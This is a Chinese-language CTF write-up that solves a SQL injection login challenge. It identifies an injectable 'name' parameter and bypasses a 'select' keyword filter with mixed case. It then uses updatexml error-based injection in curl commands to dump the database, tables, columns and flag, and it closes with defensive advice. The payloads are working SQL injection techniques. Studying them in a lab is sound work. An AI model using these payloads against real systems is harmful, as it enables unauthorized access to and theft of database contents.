---
title: 7-SQL注入-2
date: 2026-07-09
categories:
  - CTF
  - WEB
tags:
  - SQL注入
  - 报错注入
  - updatexml
  - 关键字绕过
---

# 1. 题目分析

- **目标 URL**：`http://xxx.http-ctf2.dasctf.com/login.php`
- **页面类型**：登录页面（N1 后台管理系统），通过 AJAX POST 提交登录
- **技术栈**：OpenResty (Nginx) + PHP/5.5.9-1ubuntu4.29 + MariaDB

## 初始探测

访问 `/` 直接返回 403，但 `/login.php` 存在：

```bash
curl -s -i "TARGET/"
# → 403 Forbidden

curl -s -i "TARGET/login.php"
# → 200 OK，登录表单页面
```

HTTP 响应头关键信息：

| 响应头 | 值 | 含义 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 中间件 |
| `X-Powered-By` | `PHP/5.5.9-1ubuntu4.29` | 后端 PHP 5.5.9（Ubuntu 14.04） |

# 2. 信息收集

## 2.1 页面分析

访问 `/login.php`，页面显示「登录N1后台管理系统」的表单，有两个输入框：
- `id="login_name"` → 账户
- `id="login_password"` → 密码

HTML 注释中有关键提示：

```html
<!-- 如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦-->
```

## 2.2 分析前端 JS

`/js/index.js` 揭示了 AJAX 提交细节：

```javascript
function login(name, password_) {
    $.ajax({
        url: URL,
        type: "POST",
        dataType: "json",
        data: {
            name: name,      // ← 参数名为 name
            pass: password_  // ← 参数名为 pass
        },
        success: function(data) {
            if(data.error == '0'){
                window.location.href = 'user.php'; // 登录成功跳转
            }
        }
    })
}
```

**关键发现**：
- POST 参数名是 `name` 和 `pass`（不是 `login_name`/`login_password`）
- 登录成功 (`error: 0`) 会跳转到 `user.php`

## 2.3 确定注入点

```bash
# 正常登录 → 账号或密码错误
curl -s -X POST -d "name=admin&pass=admin" "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}

# 添加单引号 → SQL 语法报错
curl -s -X POST -d "name=admin'&pass=admin" "TARGET/login.php?tips=1"
# → You have an error in your SQL syntax... near ''admin''' at line 1
```

确认 `name` 参数存在 SQL 注入，且为**单引号字符型**。

## 2.4 确认布尔盲注基底

```bash
# TRUE 条件（用户存在）
curl -s -X POST -d "name=admin' and 1=1 and '1'='1&pass=x" "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}

# FALSE 条件（用户不存在）
curl -s -X POST -d "name=admin' and 1=2 and '1'='1&pass=x" "TARGET/login.php"
# → {"error":1,"msg":"账号不存在"}
```

两种响应状态：
- **TRUE**：`msg="账号或密码错误"` → SQL 条件成立
- **FALSE**：`msg="账号不存在"` → SQL 条件不成立

# 3. 漏洞分析

## 3.1 推理链

```
线索 1：login.php 有 name/pass 登录表单
  ↓
线索 2：HTML 注释提示 ?tips=1 可开启 SQL 错误显示
  ↓
线索 3：admin' 触发 SQL 语法错误 → 确认注入点
  ↓
线索 4：load_file() 可读取 /var/www/html/user.php
  ↓ → 源码显示 "flag is in the database!"
确认 flag 在数据库中 → 需要报错注入提取
  ↓
线索 5：sELECT 大小写混合可以绕过关键字过滤！
```

## 3.2 关键字绕过

本题在 PHP 端设置了关键字黑名单过滤 `select`（大小写不敏感）：

| 查询内容 | 使用的关键字 | 结果 |
|---------|------------|------|
| `select group_concat(table_name) from ...` | 全小写 `select` | ❌ SQL 语法错误 |
| `sELECT group_concat(table_name) from ...` | 混合大小写 `sELECT` | ✅ XPATH 错误回显数据 |

**绕过方法**：大小写混合，如 `sELECT`、`SeLeCt` 等。

## 3.3 注释符测试

| 注释符 | URL 编码 | 结果 |
|--------|---------|------|
| `--+` | `--+` | ❌ 不生效 |
| `-- ` (尾部空格) | `--%20` | ✅ 可用 |
| `#` | `%23` | ✅ 可用 |

## 3.4 选择报错注入

布尔盲注速度太慢（每字符 8 次请求），且 `load_file` 已经确认 flag 在数据库。利用 `tips=1` 的 MySQL 错误回显功能，使用 `updatexml()` 函数进行报错注入，一次请求即可获取数据。

**updatexml 报错注入原理**：

```sql
updatexml(1, concat(0x7e, (子查询)), 1)
```

`updatexml()` 的第二个参数要求是有效的 XPath 表达式。当传入非法 XPath（`~` 开头 + 查询结果）时，MySQL 会抛出 XPATH 语法错误，错误信息中包含查询结果。

## 3.5 完整 SQL 查询推演

```
后端 SQL 推测：
┌──────────────────────────────────────────────────────────┐
│ SELECT * FROM users WHERE name='$name' AND pass='$pass'   │
└──────────────────────────────────────────────────────────┘

我们的注入：
name = 1' and updatexml(1,concat(0x7e,(sELECT database())),1)#

最终执行的 SQL：
┌──────────────────────────────────────────────────────────┐
│ SELECT * FROM users                                      │
│ WHERE name='1'                                           │
│   and updatexml(1,concat(0x7e,(sELECT database())),1)#   │
│   AND pass='1'  ← 被 # 注释掉                             │
└──────────────────────────────────────────────────────────┘
```

关键点：
- 注入在 `name` 参数，`pass` 参数填任意值
- `#` 注释掉后面的 `AND pass='...'` 部分
- `updatexml()` 产生 XPATH 错误，回显子查询结果

# 4. 漏洞利用

## 4.1 获取数据库信息

```bash
# 数据库名
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~note'        → 数据库名：note

# 版本信息
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT version())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~5.5.64-MariaDB-1ubuntu0.14.04.1'
```

- 数据库名：`note`（与 SQL 注入-1 相同）
- 版本：MariaDB 5.5.64

## 4.2 获取表名

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema=database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~fl4g,users'
```

表名：`fl4g`、`users`

## 4.3 获取列名

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_schema=database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~flag,id,username,passwd'
```

`fl4g` 和 `users` 的列（合在一起）：`flag`（显然在 fl4g 表）、`id`、`username`、`passwd`

## 4.4 获取 Flag

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT * from fl4g limit 1)),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~n1book{login_sqli_is_nice}'
```

## 4.5 数据库结构总结

```
数据库: note
├── users (id, username, passwd)   — 用户表
└── fl4g (flag, ...)               — flag 存储表
```

# 5. Flag

```
n1book{login_sqli_is_nice}
```

# 6. 知识点总结

## 6.1 技术要点

| 技术点 | 说明 |
|--------|------|
| **报错注入 (updatexml)** | 利用 `updatexml()` 函数的 XPath 错误回显数据，一次请求出结果，比布尔盲注高效得多 |
| **关键字过滤绕过** | `select` 被过滤（大小写不敏感），使用 `sELECT` 混合大小写绕过 |
| **注释符** | `#` 和 `-- `（尾部空格）都可用，`--+` 在这个环境不生效 |
| **AJAX 参数发现** | 通过分析 JS 源码确认 POST 参数名为 `name` 和 `pass`（而非 HTML 中的 `login_name`/`login_password`） |
| **调试参数** | `tips=1` 参数开启 MySQL 错误回显，是报错注入的前提 |

## 6.2 与 SQL 注入-1 的对比

| 维度 | SQL 注入-1 | SQL 注入-2 |
|------|-----------|-----------|
| 注入类型 | UNION SELECT | 报错注入 (updatexml) |
| 注入点 | GET 参数 `id` | POST 参数 `name` |
| 调试参数 | `tips=1` 显示完整 SQL | `tips=1` 显示 MySQL 错误 |
| 关键字过滤 | 无 | `select` 关键词过滤 |
| 绕过方法 | 无需绕过 | `sELECT` 大小写混合 |
| 注释符 | `--+` | `#` |
| 数据库 | `note` | `note`（相同） |
| 效率 | 一次出结果 | 一次出结果 |

## 6.3 防御建议

- 使用参数化查询（Prepared Statements）
- 不要在生产环境保留调试参数（`tips=1`）
- 关键字黑名单不可靠，白名单更安全但参数化查询才是根本解决方案
- 对数据库错误信息进行统一处理，不暴露给前端

# 7. 解题链路总结图

```
访问 / → 403 Forbidden
    ↓
枚举路径 → /login.php 200
    ↓
分析 HTML → 提示 ?tips=1 开启错误回显
    ↓
分析 JS → name/pass 为 POST 参数
    ↓
admin' → SQL 语法错误 → 确认注入点
    ↓
load_file('user.php') → "flag is in the database!"
    ↓ → 确认 flag 在数据库中，需要 SQL 提取
测试 updatexml 报错注入
    ↓
发现 select 关键字被过滤
    ↓
使用 sELECT 大小写绕过 ✅
    ↓
updatexml(1,concat(0x7e,(sELECT database())),1)#
    ↓ → database: note
updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
    ↓ → tables: fl4g, users
updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_schema=database())),1)#
    ↓ → columns: flag, id, username, passwd
updatexml(1,concat(0x7e,(sELECT * from fl4g limit 1)),1)#
    ↓ → n1book{login_sqli_is_nice} 🎉
```

# 8. 失败路径记录

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| Nginx alias 路径穿越 | 绕过 403 | 全部 404 | Nginx 无 alias 配置漏洞 |
| 布尔盲注脚本逐字提取 | 自动化大量请求 | FROM 关键字的请求全部 SQL 语法错误 | 以为是 FROM 过滤 |
| `--+` 注释 | 注释后续 SQL | 不生效（返回「账号不存在」） | 改用 `#` 或 `-- ` |
| `load_file('/flag')` | 直接读取 flag 文件 | 文件不存在 | flag 在数据库中 |
| 全小写 `select ... from ...` | 正常执行 | SQL 语法错误 | **发现 `select` 关键字过滤** |
| 双写绕过 `seselectlect` | 绕过过滤 | 失败 | 不是 `str_replace` 过滤 |
